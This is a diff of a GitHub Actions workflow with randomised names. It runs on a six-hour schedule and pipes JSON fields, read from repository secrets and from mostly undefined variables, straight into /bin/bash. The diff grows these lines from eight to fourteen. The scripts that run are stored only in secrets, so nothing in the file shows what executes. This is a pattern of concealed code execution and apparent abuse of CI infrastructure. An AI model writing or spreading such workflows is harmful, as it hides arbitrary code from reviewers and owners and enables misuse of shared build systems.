@@ -3,23 +3,29 @@ name: taomanchang7816
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '0 2/6 * * *'
 
-jobs:  # 30238
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: taomanchang7816
         env:
-          jn19: ${{ secrets.jn19 }}
+          eaty784: ${{ secrets.eaty784 }}
         run: |
-          echo $jn19 | jq -r .unckx64937 | /bin/bash
-          echo $s23197 | jq -r .maq74 | /bin/bash
-          echo $lj58769 | jq -r .vsngo675 | /bin/bash
-          echo $lrhx2 | jq -r .bk2151 | /bin/bash
-          echo $k216 | jq -r .rzs453 | /bin/bash
-          echo $okxz8 | jq -r .r65 | /bin/bash
-          echo $epdr03 | jq -r .rdp55453 | /bin/bash
-          echo $uziw40 | jq -r .tez70765 | /bin/bash
+          echo $eaty784 | jq -r .lb3 | /bin/bash
+          echo $zzs8 | jq -r .gly5498 | /bin/bash
+          echo $fptbt9 | jq -r .mtkmq2 | /bin/bash
+          echo $dw182 | jq -r .vtow4704 | /bin/bash
+          echo $xaohz22922 | jq -r .d25612 | /bin/bash
+          echo $vj2266 | jq -r .yaah1 | /bin/bash
+          echo $gkg48974 | jq -r .cf6409 | /bin/bash
+          echo $xzhnn44707 | jq -r .jp24135 | /bin/bash
+          echo $e238 | jq -r .gdkxe3 | /bin/bash
+          echo $fte453 | jq -r .nkno2897 | /bin/bash
+          echo $anxfx87 | jq -r .yaei67 | /bin/bash
+          echo $q42 | jq -r .aoz9109 | /bin/bash
+          echo $pzl2006 | jq -r .fra72915 | /bin/bash
+          echo $yuvuk963 | jq -r .viq0 | /bin/bash
 
